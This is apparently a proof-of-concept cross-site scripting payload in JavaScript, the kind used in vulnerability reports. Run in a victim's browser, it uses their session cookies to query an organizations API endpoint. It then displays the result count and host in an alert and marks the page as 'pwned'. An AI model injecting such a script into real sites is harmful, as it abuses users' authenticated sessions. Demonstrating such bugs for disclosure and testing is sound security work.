(function () {
  var host = location.host;
  fetch('/api/v1/organizations/', { credentials: 'include' })
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (j) {
      var n = (j && j.results) ? j.results.length : 'n/a';
      var msg = 'XSS OK\nhost: ' + host + '\norgs for this session: ' + n + '\n' + location.pathname;
      console.log('[POC] ' + msg.replace(/\n/g, ' | '));
      alert(msg);
    })
    .catch(function (e) { alert('XSS OK (fetch err)\n' + host); });
  document.documentElement.setAttribute('data-pwned', '1');
})();
